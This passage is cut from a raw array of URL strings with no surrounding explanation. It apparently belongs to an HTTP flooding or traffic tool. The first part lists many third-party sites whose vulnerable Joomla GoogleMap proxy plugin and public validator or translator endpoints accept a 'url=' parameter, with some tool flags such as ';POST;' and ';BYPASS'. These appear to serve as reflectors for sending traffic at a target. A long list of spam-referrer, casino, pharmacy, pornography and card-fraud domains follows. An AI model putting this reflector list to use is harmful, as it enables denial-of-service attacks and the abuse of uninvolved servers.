"http://html.strost.ch/dgi/plugins/content/plugin_googlemap2_proxy.php?url=", "http://ijzerhandeljanssen.nl/web/plugins/content/plugin_googlemap2_proxy.php?url=", "http://jigsaw.w3.org/css-validator/validator?uri=", "http://karismatic.com.my/new/plugins/content/plugin_googlemap2_proxy.php?url=", "http://klaassienatuinstra.nl/plugins/content/plugin_googlemap2_proxy.php?url=", "http://kobbeleia.net/joomla/plugins/content/plugin_googlemap2_proxy.php?url=", "http://krd-medway.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=", "http://lab.univ-batna.dz/lea/plugins/system/plugin_googlemap2_proxy.php?url=", "http://laresmadrid.org/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=", "http://lavori.joomlaskin.it/italyhotels/wp-content/plugins/js-multihotel/includes/show_image.php?w=1&h=1&file=", "http://link2europe.com/joomla/plugins/content/plugin_googlemap2_proxy.php?url=", "http://mentzerrepairs.com/plugins/system/plugin_googlemap2_proxy.php?url=", "http://minterne.co.uk/mjs/plugins/content/plugin_googlemap2_proxy.php?url=", "http://mobilrecord.com/plugins/content/plugin_googlemap2_proxy.php?url=", "http://netsec-reborn.onion/QuickStresser-virus?id=", "http://old.ucpb.org/plugins/content/plugin_googlemap2_proxy.php?url=", "http://online.htmlvalidator.com/php/onlinevallite.php?url=", "http://panel.stopthehacker.com/services/validate-payflow?email=1@1.com&callback=a&target=", "http://peelmc.ca/plugins/content/plugin_googlemap2_proxy.php?url=", "http://ping-admin.ru/index.sema;POST;ping-admin.ru.txt", "http://policlinicamonteabraao.com/plugins/content/plugin_googlemap2_proxy.php?url=", "http://potholepeople.co.nz/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=", "http://prosperitydrug.com/plugins/content/plugin_googlemap2_proxy.php?url=", "http://qa-dev.w3.org/unicorn/check?ucn_task=conformance&ucn_uri=", "http://regex.info/exif.cgi?url=", "http://s2p.lt/main/plugins/content/plugin_googlemap2_proxy.php?url=", "http://santaclaradelmar.com/hoteles/wp-content/plugins/js-multihotel/includes/show_image.php?w=1&h=1&file=", "http://scu-oldesloe.de/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=", "http://secret.leylines.info/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=", "http://smartonecity.com/pt/plugins/content/plugin_googlemap2_proxy.php?url=", "http://snelderssport.nl/web/plugins/content/plugin_googlemap2_proxy.php?url=", "http://sova-tour.com.ua/plugins/system/plugin_googlemap2_proxy.php?url=", "http://stockbridgetownhall.co.uk/plugins/content/plugin_googlemap2_proxy.php?url=", "http://streamitwebseries.twww.tv/proxy.php?url=", "http://sunnyhillsassistedliving.com/plugins/content/plugin_googlemap2_proxy.php?url=", "http://suttoncenterstore.com/plugins/system/plugin_googlemap2_proxy.php?url=", "http://systemnet.com.ua/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=", "http://thebluepine.com/plugins/system/plugin_googlemap2_proxy.php?url=", "http://thevintagechurch.com/www2/index.php?url=/plugins/content/plugin_googlemap2_proxy.php?url=", "http://toddlers.nalanda.edu.in/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=", "http://translate.google.com/translate?u=", "http://translate.yandex.net/tr-url/ru-uk.uk/", "http://translate.yandex.ru/translate?srv=yasearch&lang=ru-uk&url=", "http://translate.yandex.ua/translate?srv=yasearch&lang=ru-uk&url=", "http://validator.w3.org/check?uri=", "http://validator.w3.org/checklink?uri=", "http://validator.w3.org/feed/check.cgi?url=", "http://validator.w3.org/mobile/check?docAddr=", "http://validator.w3.org/nu/?doc=", "http://validator.w3.org/p3p/20020128/p3p.pl?uri=", "http://validator.w3.org/p3p/20020128/policy.pl?uri=", "http://validator.w3.org/unicorn/check?ucn_task=conformance&ucn_uri=", "http://waggum-bevenrode.sg-bevenrode.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=", "http://web-sniffer.net/?url=", "http://whitehousesurgery.org/plugins/content/plugin_googlemap2_proxy.php?url=", "http://worldwide-trips.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=", "http://www-test.cisel.ch/web/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.abc-haus.ch/reinigung/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.abs-silos.de/en/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.aculaval.com/joomla/plugins/system/plugin_googlemap2_proxy.php?url=", "http://www.admksg.ru/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.alhambrahotel.net/site/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.aliento.ch/cms/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.arantzabelaikastola.com/webgunea//plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.arbitresmultisports.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=", "http://www.architettaresas.it/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=", "http://www.astecdisseny.com/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.authentic-luxe-locations.com/wp-content/plugins/js-multihotel/includes/show_image.php?w=1&h=1&file=", "http://www.autoklyszewski.pl/autoklyszewski/mambots/content/plugin_googlemap2_proxy.php?url=", "http://www.awf.co.nz/plugins/system/plugin_googlemap3_proxy.php?url=", "http://www.benawifi.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=", "http://www.bergenpol.com/cms//plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.bing.com/search?q=", "http://www.bongert.lu/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=", "http://www.build.or.at/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.bus-reichert.eu/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=", "http://www.caiverbano.it/sito/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.cbcstittsville.com/home/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.centroaquaria.com/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.ciutatdeivissa.org/portal/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.comicgeekspeak.com/proxy.php?url=", "http://www.computerpoint3.it/cp3/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=", "http://www.contrau.com.br/web/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.copiflash.com/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.crestwoodpediatric.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=", "http://www.cynthiasays.com/mynewtester/cynthia.exe?rptmode=-1&url1=", "http://www.d1010449.cp.blacknight.com/cpr.ie/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.dahlnet.no/v2/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=", "http://www.dbaa.co.za/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=", "http://www.dierenhotelspaubeek.nl/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.dog-ryusen.com/plugins/system/plugin_googlemap2_proxy.php?url=", "http://www.dr-farfar.com", "http://www.dunaexpert.hu/home/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.epcelektrik.com/en/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=", "http://www.fare-furore.com/com-line/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.fare-furore.com/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.fillmorefairways.com/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.fmradiom.hu/palosvorosmart/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.footgoal33.com/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.fotorima.com/rima/site2/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.gaston-schul.nl/DU/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.gaston-schul.nl/FR/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.gillinghamgurdwara.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.gilmeuble.ch/cms/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.google.com/?q=", "http://www.google.com/ig/add?feedurl=", "http://www.google.com/ig/adde?moduleurl=", "http://www.google.com/translate?u=", "http://www.gretnadrug.com/plugins/system/plugin_googlemap2_proxy.php?url=", "http://www.hammondgolf.com/plugins/system/plugin_googlemap2_proxy.php?url=", "http://www.homevisionsinc.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=", "http://www.hortonmccormick.com/cms/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.hotelmonyoli.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=", "http://www.icel.be/cms/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.idea-designer.com/idea/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.iguassusoft.com/site/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.jana-wagenknecht.de/wcms/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.kanzlei-berendes.de/homepage/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.keenecinemas.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=", "http://www.kita-spielhaus.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.kjg-hemer.de/joomla/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.labonnevie-guesthouse-jersey.com/site/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.lacasaencarilo.com.ar/sitio/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.lbajoinery.com.au/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.losaromos-spa.com.ar/cms/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.losaromos-spa.com.ar/~losaromo/cms/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.map-mc.com/plugins/system/plugin_googlemap2_proxy.php?url=", "http://www.maxxxi.ru/plugins/system/plugin_googlemap2_proxy.php?url=", "http://www.mcdp.eu/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=", "http://www.minterne.co.uk/mjs/plugins/content/plugin_googlemap2_proxy.php?url=?url=", "http://www.netacad.lviv.ua/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=", "http://www.netvibes.com/subscribe.php?url=", "http://www.nickclift.co.uk/web/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.oceans-wien.com/plugins/system/plugin_googlemap2_proxy.php?url=;BYPASS", "http://www.oldbrogue.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=", "http://www.oliebollen.me/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=", "http://www.onlinewebcheck.com/check.php?url=", "http://www.owl.cat/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=", "http://www.palagini.it/palagini/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.paro-nl.com/v2/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.parsifaldisco.com/joomla/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.phimedia.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=", "http://www.podosys.com/csm/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.precak.sk/penzion/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.printingit.ie/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.pyrenees-cerdagne.com/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.racersedgekarting.com/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.renault-windisch.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.rethinkingjournalism.com/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.riegler-dorner.at/joomla/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.rinner-alm.com/plugins/system/plugin_googlemap2_proxy.php?url=", "http://www.rotisseriesalaberry.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=", "http://www.sealyham.sk/joomla/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.seebybike.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=", "http://www.seevilla-dr-sturm.at/cms/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.siroki.it/newsite/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.sistem5.net/ww/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=", "http://www.sizzlebistro.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=", "http://www.sounders.es/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.spvgg-roedersheim.de/web/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=", "http://www.stephanus-web.de/joomla1015/mambots/content/plugin_googlemap2_proxy.php?url=", "http://www.suelcasa.com/suelcasa/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.sultanpalace.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.tajmahalrestaurant.co.za/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=", "http://www.tcl.lu/Site/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.tijssen-staal.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.tilmouthwell.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=", "http://www.translate.ru/url/translation.aspx?direction=er&sourceURL=", "http://www.triatarim.com.tr/TriaEn/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.tus-haltern.de/site/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.uchlhr.com/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.valleyview.sa.edu.au/plugins/system/plugin_googlemap2_proxy.php?url=", "http://www.veloclub.ru/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=", "http://www.vertexi.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=", "http://www.vetreriafasanese.com/plugins/system/plugin_googlemap2_proxy.php?url=", "http://www.viewdns.info/ismysitedown/?domain=", "http://www.villamagnoliarelais.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=", "http://www.virmcc.de/joomla/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.virtualsoft.pl/plugins/content/plugin_googlemap3_proxy.php?url=", "http://www.visitsliven.com/bg/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.vm-esslingen.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.w3.org/2001/03/webdata/xsv?style=xsl&docAddrs=", "http://www.w3.org/2005/08/online_xslt/xslt?xmlfile=http://www.w3.org&xslfile=", "http://www.w3.org/2005/08/online_xslt/xslt?xslfile=http%3A%2F%2Fwww.w3.org%2F2002%2F08%2Fextract-semantic.xsl&xmlfile=", "http://www.w3.org/RDF/Validator/ARPServlet?URI=", "http://www.w3.org/services/tidy?docAddr=", "http://www.watchmouse.com/en/checkit.php?c=jpcheckit&vurl=", "http://www.yerbabuenacuisine.com/plugins/system/plugin_googlemap2_proxy.php?url=", "http://www.yigilca.gov.tr/_tr/plugins/content/plugin_googlemap2_proxy.php?url=", "http://www.zahnarzt-buhl.de/praxis/plugins/content/plugin_googlemap2_proxy.php?url=", "https://01casino-x.ru", "https://033nachtvandeliteratuur.nl", "https://03e.info", "https://03p.info", "https://0n-line.tv", "https://1-99seo.com", "https://1-best-seo.com", "https://1-free-share-buttons.com", "https://100-reasons-for-seo.com", "https://100dollars-seo.com", "https://12-reasons-for-seo.net", "https://12masterov.com", "https://12u.info", "https://15-reasons-for-seo.com", "https://1kreditzaim.ru", "https://1pamm.ru", "https://1st-urist.ru", "https://1webmaster.ml", "https://1wek.top", "https://1winru.ru", "https://1x-slot.site", "https://1x-slots.site", "https://1xbet-entry.ru", "https://1xbetonlines1.ru", "https://1xslot-casino.online", "https://1xslot-casino.ru", "https://1xslot-casino.site", "https://1xslot.site", "https://1xslots-africa.site", "https://1xslots-brasil.site", "https://1xslots-casino.site", "https://1xslots.africa", "https://1xslots.site", "https://2-best-seo.com", "https://2-easy.xyz", "https://2-go-now.xyz", "https://24chasa.bg", "https://24h.doctor", "https://24x7-server-support.site", "https://2your.site", "https://3-best-seo.com", "https://3-letter-domains.net", "https://3dgame3d.com", "https://3waynetworks.com", "https://4-best-seo.com", "https://40momporntube.com", "https://4inn.ru", "https://4istoshop.com", "https://4webmasters.org", "https://4xcasino.ru", "https://5-best-seo.com", "https://5-steps-to-start-business.com", "https://5elementov.ru", "https://5forex.ru", "https://6-best-seo.com", "https://69-13-59.ru", "https://6hopping.com", "https://7-best-seo.com", "https://70casino.online", "https://7kop.ru", "https://7makemoneyonline.com", "https://7milliondollars.com", "https://7ooo.ru", "https://7zap.com", "https://8-best-seo.com", "https://8xv8.com", "https://9-best-seo.com", "https://99-reasons-for-seo.com", "https://QIWI.xyz", "https://a-elita.in.ua", "https://abcdefh.xyz", "https://abcdeg.xyz", "https://abclauncher.com", "https://acads.net", "https://acarreo.ru", "https://account-my1.xyz", "https://accs-store.ru", "https://actualremont.ru", "https://acunetix-referrer.com", "https://adanih.com", "https://adcash.com", "https://add.my.yahoo.com/rss?url=", "https://adelachrist.top", "https://adf.ly", "https://adpostmalta.com", "https://adrenalinebot.net", "https://adrenalinebot.ru", "https://adspart.com", "https://adtiger.tk", "https://adventureparkcostarica.com", "https://adviceforum.info", "https://advokateg.xyz", "https://aerodizain.com", "https://aerotour.ru", "https://affiliate-programs.biz", "https://affordablewebsitesandmobileapps.com", "https://afora.ru", "https://agro-gid.com", "https://agtl.com.ua", "https://ai-seo-services.com", "https://aibolita.com", "https://aidarmebel.kz", "https://aitiman.ae", "https://akuhni.by", "https://albuteroli.com", "https://alcobutik24.com", "https://alexsander.ch", "https://alfabot.xyz", "https://alibestsale.com", "https://aliexsale.ru", "https://alinabaniecka.pl", "https://alkanfarma.org", "https://all-news.kz", "https://all4bath.ru", "https://allcryptonews.com", "https://allergick.com", "https://allergija.com", "https://allknow.info", "https://allmarketsnewdayli.gdn", "https://allnews.md", "https://allnews24.in", "https://allproblog.com", "https://allvacancy.ru", "https://allwomen.info", "https://allwrighter.ru", "https://alma-mramor.com.ua", "https://alp-rk.ru", "https://alphaopt24.ru", "https://alpharma.net", "https://altermix.ua", "https://amazon-seo-service.com", "https://amos-kids.ru", "https://amp-project.pro", "https://amt-k.ru", "https://amtel-vredestein.com", "https://amylynnandrews.xyz", "https://anabolics.shop", "https://analytics-ads.xyz", "https://anapa-inns.ru", "https://andrewancheta.com", "https://android-style.com", "https://animalphotos.xyz", "https://animenime.ru", "https://annaeydlish.top", "https://anti-crisis-seo.com", "https://anticrawler.org", "https://antiguabarbuda.ru", "https://antonovich-design.com.ua", "https://apollon-market-url.org", "https://applepharma.ru", "https://apteka-doc.ru", "https://apteka-pharm.ru", "https://arabic-poetry.com", "https://arendadogovor.ru", "https://arendakvartir.kz", "https://arendovalka.xyz", "https://argo-visa.ru", "https://arkkivoltti.net", "https://artblog.top", "https://artclipart.ru", "https://artdeko.info", "https://artpaint-market.ru", "https://artparquet.ru", "https://artpress.top", "https://arturs.moscow", "https://aruplighting.com", "https://ask-yug.com", "https://asupro.com", "https://asynt.net", "https://atleticpharm.org", "https://atyks.ru", "https://auto-b2b-seo-service.com", "https://auto-complex.by", "https://auto-kia-fulldrive.ru", "https://auto-seo-service.org", "https://autoblog.org.ua", "https://autofuct.ru", "https://automobile-spec.com", "https://autoseo-service.org", "https://autoseo-traffic.com", "https://autoseotips.com", "https://autoservic.by", "https://autovideobroadcast.com", "https://avcoast.com", "https://aviaseller.su", "https://aviva-limoux.com", "https://avkzarabotok.info", "https://avtointeres.ru", "https://avtorskoe-vino.ru", "https://avtovykup.kz", "https://aworlds.com", "https://axcus.top", "https://azartclub.org", "https://azbukafree.com", "https://azlex.uz", "https://backlinks-fast-top.com", "https://baixar-musicas-gratis.com", "https://baladur.ru", "https://balakhna.online", "https://balayazh.com", "https://balitouroffice.com", "https://balkanfarma.org", "https://bankhummer.co", "https://barbarahome.top", "https://bard-real.com.ua", "https://batietiket.com", "https://batut-fun.ru", "https://bavariagid.de", "https://bdf-tracker.top", "https://beachtoday.ru", "https://beauty-lesson.com", "https://beclean-nn.ru", "https://bedroomlighting.us", "https://belreferatov.net", "https://beremenyashka.com", "https://best-deal-hdd.pro", "https://best-mam.ru", "https://best-ping-service-usa.blue", "https://best-printmsk.ru", "https://best-seo-offer.com", "https://best-seo-software.xyz", "https://best-seo-solution.com", "https://bestbookclub.ru", "https://bestfortraders.com", "https://bestmobilityscooterstoday.com", "https://bestofferhddbyt.info", "https://bestofferhddeed.info", "https://bestvpnrating.com", "https://bestwebsitesawards.com", "https://bet-winner1.ru", "https://betslive.ru", "https://betterhealthbeauty.com", "https://bettorschool.ru", "https://bez-zabora.ru", "https://bezprostatita.com", "https://bhf.vc", "https://bif-ru.info", "https://biglistofwebsites.com", "https://billiard-classic.com.ua", "https://billyblog.online", "https://bin-brokers.com", "https://binokna.ru", "https://bio-market.kz", "https://biplanecentre.ru", "https://bird1.ru", "https://bitcoin-ua.top", "https://biteg.xyz", "https://bitniex.com", "https://biz-law.ru", "https://bizru.info", "https://bki24.info", "https://black-friday.ga", "https://black-tip.top", "https://blackhatworth.com", "https://blog100.org", "https://blog2019.top", "https://blog2019.xyz", "https://blog4u.top", "https://blogking.top", "https://bloglag.com", "https://blogseo.xyz", "https://blogstar.fun", "https://blogtotal.de", "https://blogua.org", "https://blue-square.biz", "https://bluerobot.info", "https://bo-vtb24.ru", "https://boltalko.xyz", "https://boltushkiclub.ru", "https://bonkers.name", "https://bonus-spasibo-sberbank.ru", "https://bonus-vtb.ru", "https://books-top.com", "https://boostmyppc.com", "https://botamycos.fr", "https://bottraffic4free.club", "https://bottraffic4free.host", "https://bpro1.top", "https://brakehawk.com", "https://brateg.xyz", "https://brauni.com.ua", "https://bravica.biz", "https://bravica.com", "https://bravica.me", "https://bravica.net", "https://bravica.news", "https://bravica.online", "https://bravica.pro", "https://bravica.ru", "https://bravica.su", "https://break-the-chains.com", "https://brickmaster.pro", "https://brillianty.info", "https://brk-rti.ru", "https://brooklynsays.com", "https://brothers-smaller.ru", "https://brusilov.ru", "https://bsell.ru", "https://btcnix.com", "https://btt-club.pro", "https://budilneg.xyz", "https://budmavtomatika.com.ua", "https://bufetout.ru", "https://buhproffi.ru", "https://buildnw.ru", "https://buildwithwendy.com", "https://buketeg.xyz", "https://bukleteg.xyz", "https://bulgaria-web-developers.com", "https://bur-rk.ru", "https://burger-imperia.com", "https://burn-fat.ga", "https://business-online-sberbank.ru", "https://buttons-for-website.com", "https://buttons-for-your-website.com", "https://buy-cheap-online.info", "https://buy-cheap-pills-order-online.com", "https://buy-forum.ru", "https://buy-meds24.com", "https://buynorxx.com", "https://buypillsonline24h.com", "https://buypuppies.ca", "https://c2bit.hk", "https://call-of-duty.info", "https://cancerfungus.com", "https://candida-society.org.uk", "https://cannazon-market.org", "https://carder.me", "https://carder.tv", "https://carders.ug", "https://cardiosport.com.ua", "https://cardsdumps.com", "https://carezi.com", "https://carivka.com.ua", "https://carscrim.com", "https://cartechnic.ru", "https://cashforum.cc", "https://casino-top3.fun", "https://casino-top3.online", "https://casino-top3.ru", "https://casino-top3.site", "https://casino-top3.space", "https://casino-top3.website", "https://casino-v.site", "https://casino-vulkane.com", "https://casino-x.host", "https://catherinemill.xyz", "https://catterybengal.com", "https://cattyhealth.com", "https://cazino-v.online", "https://cazino-v.ru", "https://ccfullzshop.com", "https://celestepage.xyz", "https://cenokos.ru", "https://cenoval.ru", "https://certifywebsite.win", "https://cezartabac.ro", "https://chainii.ru", "https://chatroulette.life", "https://chcu.net", "https://cheap-trusted-backlinks.com", "https://cheapkeys.ovh", "https://cheappills24h.com", "https://check-host.net", "https://check-host.net/", "https://chinese-amezon.com", "https://chip35.ru", "https://chipmp3.ru", "https://chizhik-2.ru", "https://ci.ua", "https://cityadspix.com", "https://citybur.ru", "https://cityreys.ru", "https://civilwartheater.com", "https://cleandom.in.ua", "https://clicksor.com", "https://climate.by", "https://clothing-deal.club", "https://club-lukojl.ru", "https://coderstate.com", "https://codysbbq.com", "https://coeus-solutions.de", "https://coffeemashiny.ru", "https://coinswitch.cash", "https://coleso.md", "https://collectinviolity.com", "https://columb.net.ua", "https://commentag.com", "https://commerage.ru", "https://comp-pomosch.ru", "https://compliance-alex.xyz", "https://compliance-alexa.xyz", "https://compliance-andrew.xyz", "https://compliance-barak.xyz", "https://compliance-brian.xyz", "https://compliance-don.xyz", "https://compliance-donald.xyz", "https://compliance-elena.xyz", "https://compliance-fred.xyz", "https://compliance-george.xyz", "https://compliance-irvin.xyz", "https://compliance-ivan.xyz", "https://compliance-john.top", "https://compliance-julianna.top", "https://computer-remont.ru", "https://conciergegroup.org", "https://concretepol.com", "https://connectikastudio.com", "https://constanceonline.top", "https://cookie-law-enforcement-aa.xyz", "https://cookie-law-enforcement-bb.xyz", "https://cookie-law-enforcement-cc.xyz", "https://cookie-law-enforcement-dd.xyz", "https://cookie-law-enforcement-ee.xyz", "https://cookie-law-enforcement-ff.xyz", "https://cookie-law-enforcement-gg.xyz", "https://cookie-law-enforcement-hh.xyz", "https://cookie-law-enforcement-ii.xyz", "https://cookie-law-enforcement-jj.xyz", "https://cookie-law-enforcement-kk.xyz", "https://cookie-law-enforcement-ll.xyz", "https://cookie-law-enforcement-mm.xyz", "https://cookie-law-enforcement-nn.xyz", "https://cookie-law-enforcement-oo.xyz", "https://cookie-law-enforcement-pp.xyz", "https://cookie-law-enforcement-qq.xyz", "https://cookie-law-enforcement-rr.xyz", "https://cookie-law-enforcement-ss.xyz", "https://cookie-law-enforcement-tt.xyz", "https://cookie-law-enforcement-uu.xyz", "https://cookie-law-enforcement-vv.xyz", "https://cookie-law-enforcement-ww.xyz", "https://cookie-law-enforcement-xx.xyz", "https://cookie-law-enforcement-yy.xyz", "https://cookie-law-enforcement-zz.xyz", "https://cool-mining.com", "https://copyrightclaims.org", "https://copyrightinstitute.org", "https://coral-info.com", "https://cosmediqueresults.com", "https://covadhosting.biz", "https://coverage-my.com", "https://covid-schutzmasken.de", "https://cp24.com.ua", "https://crazy-mining.org", "https://credit-card-tinkoff.ru", "https://credit-cards-online24.ru", "https://credit.co.ua", "https://crypto-bear.com", "https://crypto-bears.com", "https://crypto-mining.club", "https://crypto1x1.com", "https://curenaturalicancro.com", "https://curenaturalicancro.nl", "https://customsua.com.ua", "https://cyber-monday.ga", "https://dacha-svoimi-rukami.com", "https://dailyrank.net", "https://dailyseo.xyz", "https://dailystorm.ru", "https://damianis.ru", "https://darknet-hydra-onion.biz", "https://darknet.sb", "https://darknetsitesguide.com", "https://darleneblog.online", "https://darodar.com", "https://dav.kz", "https://dawlenie.com", "https://dbutton.net", "https://dcdcapital.com", "https://deart-13.ru", "https://deirdre.top", "https://delfin-aqua.com.ua", "https://delo.fund", "https://deluxewatch.su", "https://demenageur.com", "https://dengi-v-kredit.in.ua", "https://denisecarey.top", "https://deniseconnie.top", "https://dent-home.ru", "https://dentuled.net", "https://dermatovenerologiya.com", "https://deryie.com", "https://descargar-musica-gratis.net", "https://detailedvideos.com", "https://detskie-konstruktory.ru", "https://deutsche-poesie.com", "https://dev-seo.blog", "https://developers.google.com/speed/pagespeed/insights/?url=", "https://diatelier.ru", "https://dicru.info", "https://dienai.ru", "https://diplomas-ru.com", "https://dipstar.org", "https://discounttaxi.kz", "https://distonija.com", "https://divan-dekor.com.ua", "https://dividendo.ru", "https://djekxa.ru", "https://djonwatch.ru", "https://dktr.ru", "https://dna-sklad.ru", "https://dnmetall.ru", "https://docs4all.com", "https://docsarchive.net", "https://docsportal.net", "https://doctornadezhda.ru", "https://documentbase.net", "https://documentserver.net", "https://documentsite.net", "https://dodge-forum.eu", "https://doggyhealthy.com", "https://dogovorpodryada.ru", "https://dogsrun.net", "https://dojki-devki.ru", "https://dojki-hd.com", "https://dom-international.ru", "https://domain-tracker.com", "https://domashniy-hotel.ru", "https://domashniy-recepti.ru", "https://dominateforex.ml", "https://domination.ml", "https://dommdom.com", "https://domovozik.ru", "https://dompechey.by", "https://domsadiogorod.ru", "https://doska-vsem.ru", "https://dostavka-v-krym.com", "https://dosugrostov.site", "https://doxyporno.com", "https://doxysexy.com", "https://draniki.org", "https://dreamland-bg.com", "https://dreams-works.net", "https://drev.biz", "https://drive.google.com/viewerng/viewer?url=", "https://drugs-no-rx.info", "https://drugstoreforyou.com", "https://drupa.com", "https://dspautomations.com", "https://duitbux.info", "https://dumpsccshop.com", "https://dvk-stroi.ru", "https://dvr.biz.ua", "https://dzinerstudio.com", "https://e-buyeasy.com", "https://e-commerce-seo.com", "https://e-commerce-seo1.com", "https://e-stroymart.kz", "https://eaptekaplus.ru", "https://earn-from-articles.com", "https://earnian-money.info", "https://easycommerce.cf", "https://ecblog.xyz", "https://ecommerce-seo.org", "https://ecomp3.ru", "https://econom.co", "https://edakgfvwql.ru", "https://edmed-sonline.com", "https://eduardoluis.com", "https://educhess.ru", "https://edudocs.net", "https://eduinfosite.com", "https://eduserver.net", "https://ege-essay.ru", "https://ege-krasnoyarsk.ru", "https://egovaleo.it", "https://ek-invest.ru", "https://ekatalog.xyz", "https://ekbspravka.ru", "https://eko-gazon.ru", "https://ekoproekt-kr.ru", "https://ekto.ee", "https://eldoradorent.az", "https://electric-blue-industries.com", "https://elegante-vitrage.ru", "https://elektrikovich.ru", "https://elementspluss.ru", "https://elenatkachenko.com.ua", "https://elentur.com.ua", "https://elizabethbruno.top", "https://ellemarket.com", "https://elmifarhangi.com", "https://elvel.com.ua", 